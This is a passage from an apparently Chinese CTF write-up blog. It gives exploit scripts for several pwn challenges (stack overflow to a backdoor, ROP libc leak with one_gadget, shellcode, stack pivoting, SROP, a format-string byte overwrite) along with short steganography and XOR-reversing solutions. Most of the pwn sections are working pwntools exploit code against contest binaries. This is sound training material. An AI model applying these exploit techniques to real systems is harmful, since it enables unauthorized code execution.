ret控制执行流，所以要保证v2被覆盖后能还原，case1存在栈溢出case2可以还原v2</p><p>思路如下：先case1将main函数返回地址改为backdoor接着case2将覆盖了的v2变得和qword_4040D0一致，最后case3结束循环，需要注意的点是在覆盖时要注意保证v4为0不然循环就结束了无法再执行case2</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;192.168.9.151&#x27;,55097)</span></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./1.so&#x27;)</span></span><br><span class="line">backdoor = <span class="number">0x401581</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#io.sendline(&#x27;2&#x27;)</span></span><br><span class="line"><span class="comment">#io.recvuntil(&#x27;My secret is &#x27;)</span></span><br><span class="line"><span class="comment">#canary = io.recv(16)</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">88</span>+<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(backdoor)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27; choice&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;code&#x27;</span>,payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;choice&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h3><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x3fa000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>关闭了标准输出流，有栈溢出漏洞</p><p>利用write用标准错误流泄露libc基地址打one_gadget</p><p>提权后将标准输出流重定向到标准错误流</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> 1&gt;&amp;2</span><br><span class="line"><span class="built_in">cat</span> flag</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;47.105.113.86&#x27;</span>,<span class="number">30003</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc-2.31.so&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#print(hex(libc.got[&#x27;read&#x27;]))</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#sleep(3)</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;blind now.&#x27;</span>)</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vuln = <span class="number">0x4011DD</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004012c3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004012c1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(pop_rdi) + p64(<span class="number">2</span>) + p64(pop_rsi_r15) + p64(write_got) + p64(<span class="number">0</span>) + p64(write_plt) + p64(vuln)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write_addrs=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = write_addrs - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>] + libc_base </span><br><span class="line">bin_sh = libc_base + <span class="number">0x00000000001b75aa</span></span><br><span class="line">pop_rdx_r12 = libc_base + <span class="number">0x000000000011c1e1</span></span><br><span class="line">one=<span class="number">0xe6af1</span>+libc_base</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(pop_rsi_r15)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rdx_r12)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(one)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="ez-base"><a href="#ez-base" class="headerlink" title="ez_base"></a>ez_base</h3><p>垃圾邮件隐写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">Dear Friend ; Especially for you - this amazing announcement </span><br><span class="line">. This is a one time mailing there is no need to request </span><br><span class="line">removal if you won&#x27;t want any more ! This mail is being </span><br><span class="line">sent in compliance with Senate bill 2316 , Title 1 </span><br><span class="line">; Section 303 ! This is not a get rich scheme . Why </span><br><span class="line">work for somebody else when you can become rich in </span><br><span class="line">77 months . Have you ever noticed society seems to </span><br><span class="line">be moving faster and faster and more people than ever </span><br><span class="line">are surfing the web ! Well, now is your chance to capitalize </span><br><span class="line">on this ! We will help you turn your business into </span><br><span class="line">an E-BUSINESS and sell more . You can begin at absolutely </span><br><span class="line">no cost to you . But don&#x27;t believe us . Ms Ames who </span><br><span class="line">resides in Indiana tried us and says &quot;Now I&#x27;m rich, </span><br><span class="line">Rich, RICH&quot; . We are licensed to operate in all states </span><br><span class="line">. If not for you then for your LOVED ONES - act now </span><br><span class="line">! Sign up a friend and you&#x27;ll get a discount of 30% </span><br><span class="line">! Thank-you for your serious consideration of our offer </span><br><span class="line">. Dear Friend ; Especially for you - this cutting-edge </span><br><span class="line">intelligence . This is a one time mailing there is </span><br><span class="line">no need to request removal if you won&#x27;t want any more </span><br><span class="line">! This mail is being sent in compliance with Senate </span><br><span class="line">bill 1619 ; Title 3 , Section 308 ! This is NOT unsolicited </span><br><span class="line">bulk mail . Why work for somebody else when you can </span><br><span class="line">become rich inside 62 WEEKS . Have you ever noticed </span><br><span class="line">nearly every commercial on television has a .com on </span><br><span class="line">in it &amp; nearly every commercial on television has a </span><br><span class="line">.com on in it ! Well, now is your chance to capitalize </span><br><span class="line">on this . We will help you decrease perceived waiting </span><br><span class="line">time by 130% plus process your orders within seconds </span><br><span class="line">! You can begin at absolutely no cost to you ! But </span><br><span class="line">don&#x27;t believe us ! Ms Simpson of Idaho tried us and </span><br><span class="line">says &quot;Now I&#x27;m rich, Rich, RICH&quot; ! We are licensed to </span><br><span class="line">operate in all states ! We implore you - act now . </span><br><span class="line">Sign up a friend and you get half off . God Bless ! </span><br><span class="line">Dear Friend , Especially for you - this red-hot announcement </span><br><span class="line">! This is a one time mailing there is no need to request </span><br><span class="line">removal if you won&#x27;t want any more ! This mail is being </span><br><span class="line">sent in compliance with Senate bill 2216 ; Title 6 </span><br><span class="line">; Section 303 ! THIS IS NOT MULTI-LEVEL MARKETING . </span><br><span class="line">Why work for somebody else when you can become rich </span><br><span class="line">within 71 WEEKS . Have you ever noticed nearly every </span><br><span class="line">commercial on television has a .com on in it &amp; most </span><br><span class="line">everyone has a cellphone . Well, now is your chance </span><br><span class="line">to capitalize on this . We will help you decrease perceived </span><br><span class="line">waiting time by 140% &amp; SELL MORE ! The best thing about </span><br><span class="line">our system is that it is absolutely risk free for you </span><br><span class="line">. But don&#x27;t believe us ! Mr Ames who resides in Rhode </span><br><span class="line">Island tried us and says &quot;I was skeptical but it worked </span><br><span class="line">for me&quot; . We assure you that we operate within all </span><br><span class="line">applicable laws ! DO NOT DELAY - order today ! Sign </span><br><span class="line">up a friend and you get half off . God Bless . </span><br></pre></td></tr></table></figure><p>丢该网站<a href="https://www.spammimic.com/decode.shtml">https://www.spammimic.com/decode.shtml</a></p><p>解密出base64字符，再解密base64即可。</p><h2 id="CTBUCTF"><a href="#CTBUCTF" class="headerlink" title="CTBUCTF"></a>CTBUCTF</h2><h3 id="pwnme"><a href="#pwnme" class="headerlink" title="pwnme"></a>pwnme</h3><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28217)</span></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">io=process(<span class="string">&#x27;./sign_in&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./sign_in&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./2.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#sleep(3)</span></span><br><span class="line">backdoor = <span class="number">0x40119E</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">0x8</span>)  + p64(backdoor)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Pwn me!&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="shellcode-1"><a href="#shellcode-1" class="headerlink" title="shellcode"></a>shellcode</h3><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28217)</span></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./2.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload = shellcode </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="ez-stack"><a href="#ez-stack" class="headerlink" title="ez_stack"></a>ez_stack</h3><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>简单的栈迁移，有很多gadget可以控制寄存器且有syscall，将<code>execve(&#39;/bin/sh&#39;,0,0)</code>的系统调用利用第一个read读到bss段的name上，在用后边的8个字节溢出覆盖rbp两次leave ret栈迁移到bss段上执行。</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28217)</span></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./2.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">pop_rdi = <span class="number">0x0000000000401180</span> </span><br><span class="line">pop_rsi = <span class="number">0x0000000000401182</span></span><br><span class="line">pop_rdx = <span class="number">0x000000000040117a</span></span><br><span class="line">pop_rax_syscall = <span class="number">0x000000000040117d</span></span><br><span class="line">bss = <span class="number">0x404080</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) + p64(pop_rax_syscall)+p64(<span class="number">0x3b</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;it!&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(bss)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h3><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>main函数很简单只是一个read的系统调用，存在栈溢出，有&#x2F;bin&#x2F;sh，有gift可以将rax改为0xf也就是sigreturn的系统调用号，所以可以使用pwntool中的SigreturnFrame()<code>构造影子栈通过系统调用sigreturn将此时的寄存器变为影子栈上寄存器的状态来调用</code>execve(‘&#x2F;bin&#x2F;sh’,0,0)&#96;</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28217)</span></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./2.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">bin_sh = <span class="number">0x404010</span></span><br><span class="line">syscall = <span class="number">0x40110d</span></span><br><span class="line">sigreturn = <span class="number">0x401117</span> <span class="comment"># mov rax, 0xf ; ret</span></span><br><span class="line"></span><br><span class="line">fake = SigreturnFrame()</span><br><span class="line">fake.rax = <span class="number">0x3b</span></span><br><span class="line">fake.rdi = bin_sh</span><br><span class="line">fake.rdx = <span class="number">0</span></span><br><span class="line">fake.rsi = <span class="number">0</span></span><br><span class="line">fake.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(sigreturn)+p64(syscall)+<span class="built_in">bytes</span>(fake)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="just-one"><a href="#just-one" class="headerlink" title="just_one"></a>just_one</h3><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>保护全开，有格式化字符串漏洞但是只能执行一次，rsi存着栈顶地址有后门函数，只需要修改buf[100]处的第一个字节就可以跳转到后门函数，buf在栈上所以可以直接索引参数修改最后两个字节，也就是0xEF</p><p>0xEF &#x3D; 239</p><p>测得输入地址的偏移为6，然后6 + 201(下标是从0开始，200即201) - 1 &#x3D; 206</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;ctf.ctbu.edu.cn&#x27;,33417)</span></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./2.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#sleep(3)</span></span><br><span class="line">payload = <span class="string">&quot;%239c%206$hhn&quot;</span></span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt; &quot;</span>,payload)</span><br><span class="line">io.interactive() </span><br></pre></td></tr></table></figure><h2 id="parloo"><a href="#parloo" class="headerlink" title="parloo"></a>parloo</h2><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h4 id="PositionalXOR"><a href="#PositionalXOR" class="headerlink" title="PositionalXOR"></a>PositionalXOR</h4><ol><li><p><strong>异或逻辑</strong>：</p><ul><li>每个字符的加密方式是：<code>密文字符 = 原文字符 ^ (位置 + 1)</code>（位置从 <code>0</code> 开始计数，但密钥从 <code>1</code> 开始递增）。</li><li>例如，第一个字符 <code>q</code> 的 ASCII 码为 <code>113</code>，位置为 <code>0</code>，密钥为 <code>1</code>，解密为 <code>113 ^ 1 = 112</code>，对应字符 <code>p</code>。</li></ul></li><li><p><strong>逐字符解密</strong>：</p><ul><li>对每个字符按位置依次异或，恢复原始字符。</li><li>例如：<ul><li><code>V</code>（位置 <code>5</code>）异或 <code>6</code> 得到 <code>P</code>。</li><li><code>h</code>（位置 <code>6</code>）异或 <code>7</code> 得到 <code>o</code>。</li><li><code>&#123;</code>（位置 <code>7</code>）异或 <code>8</code> 得到 <code>s</code>。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">encrypted = <span class="string">&quot;qcoq~Vh&#123;e~bccocH^@Lgt&#123;gt|g&quot;</span></span><br><span class="line">decrypted = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(c) 